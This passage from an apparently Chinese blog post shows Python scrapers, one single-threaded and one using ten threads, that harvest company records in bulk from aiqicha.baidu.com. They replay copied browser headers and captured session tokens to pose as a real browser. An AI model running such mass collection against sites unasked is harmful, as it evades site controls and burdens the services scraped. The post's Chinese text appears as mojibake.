<span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;æŠ“åˆ°çš„cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a = <span class="string">&quot;å…¬å¸åç§°:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;æ³¨å†Œèµ„é‡‘:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸ç±»å‹:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸æˆç«‹æ—¶é—´:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸åœ°å€:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;å¼€ä¸šçŠ¶å†µ:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            f.write(a)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">501</span>):</span><br><span class="line">        main(i)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ç›´æ¥çˆ¬å–è€—è´¹æ—¶é—´&quot;</span>,(end-start))</span><br></pre></td></tr></table></figure><p>æˆåŠŸçˆ¬å–5000è¡Œæ•°æ®<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011554700.png" alt="image.png"></p><p>ç¨‹åºè€—è´¹æ—¶é—´<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011554254.png" alt="image.png"></p><h3 id="2-å¤šçº¿ç¨‹çˆ¬è™«"><a href="#2-å¤šçº¿ç¨‹çˆ¬è™«" class="headerlink" title="2.å¤šçº¿ç¨‹çˆ¬è™«"></a>2.å¤šçº¿ç¨‹çˆ¬è™«</h3><p>å¼€10ä¸ªçº¿ç¨‹è·‘</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="comment">#å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;å¼€ä¸š&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;æŠ“åˆ°çš„cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686218663386_1686228429829_WB0FB0MHEc9Cck35D45asRQbQY/PoeVjFk/N0r6KlgJOBaP2AQeCctHp1+UF5PJ0r0oQ5oILGzmfycrw5JXeQkWKFeoFANP7yZEm/24Zn7bQjBOkalyujWkvRU8gYBnRfui6CEnMI6owfohQkqi47feLPDyQ304QODUtg1jr3lP0Yn+4K10FKN3G210hXv9FpwJz3ze/f6japRpezUodE+/Ac2i8kX4il0MtJjc6SRj1Smi+H0bM1xAH5/LthB1gHm0akZCD0pNskPl3oBpmNvRLcQEqf8D7heK+Krw+A1lkjfywECbMAzcktjLm9XLQHaSG+8O2W5p+F7LF0qTVHDcxw7nEkE8/Ix0zG5NnnPttJF1pvM4H4aOCoXnuARy8MuWogjpUrxI2JqjPd3Fjoz13c4usSIy1rQ5OO8BAe5syq+XIuX6+X2i9hmv4C7NwfkFPzUA0UF483F8KAgBFyVA+Pa2V8o95TjRbeCrwgLmp1q4h2tVtBtoplvnr8WKO3MG16+pHq7vcVaZzYSkxL0yIV9e0SKzgeCxmeIaFNZx2oCCtb4xND6+MRKe2VYOePXFuKYA6mG1MQ7/ZkvXz2IsG8t0dXDdZtmU0M8szb7HGxDYzXCjBXkbvmWuidBoI0xLbFSt8fBeQs2NWT0BUHwP0mRJ+52oDDTBobqYTJdZQ81bBVytZpVqeNU72/0rMnWhf2nbu0zBb4fuu5TdnClbECDrfzkzP5WQ94E5XeJSfEKw1HrmxjOKQhECNflwn8WhnkP32FDquj8e+0yLBADAVT5/dPyyeakElNGd4ZdTI10tszotkziWMyKg+qm2ST/NOpM2apFTWLxtaDePALLbwucfQ0E/aMdhYhztSbd7b28zaL0DYQEAcBwUuA4sGC3I/w63nTR00hi2n8awwTKNtpyJvvMjA1NmuwKWZvBrRLjrVwsYyFjTWVDX2cQa7u3/WHubLJo4uSuqNE3a1+FO3aGFwMZupfH7pCKA3LSRjgO829MQnzX5teielCpcywP933QFbMHbeqkn+zGXlDQ==&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">            a = <span class="string">&quot;å…¬å¸åç§°:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;æ³¨å†Œèµ„é‡‘:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸ç±»å‹:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸æˆç«‹æ—¶é—´:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;å…¬å¸åœ°å€:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;å¼€ä¸šçŠ¶å†µ:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            f.write(a)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_reptile</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> qq.empty():</span><br><span class="line">        i = qq.get()</span><br><span class="line">        main(i)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    qq = Queue()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">501</span>):</span><br><span class="line">        qq.put(i)</span><br><span class="line">    thread_number = <span class="number">10</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    Threads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(thread_number):</span><br><span class="line">        t = Thread(target=run_reptile)</span><br><span class="line">        t.start()</span><br><span class="line">        Threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> Threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ç›´æ¥çˆ¬å–è€—è´¹æ—¶é—´&quot;</span>,(end-start))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011555178.png" alt="image.png"></p><h1 id="5-å‚è€ƒæ–‡ç« "><a href="#5-å‚è€ƒæ–‡ç« " class="headerlink" title="5.å‚è€ƒæ–‡ç« "></a>5.å‚è€ƒæ–‡ç« </h1><p><a href="https://blog.csdn.net/weixin_45329040/article/details/121549098">pythonçˆ¬è™« çˆ¬å–çˆ±ä¼æŸ¥å…¬å¸ä¿¡æ¯_python çˆ±ä¼æŸ¥_ä»£ç æ°¸ä¸æŠ¥é”™çš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> çˆ¬è™« </tag>
            
            <tag> ä¿¡æ¯æœé›† </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
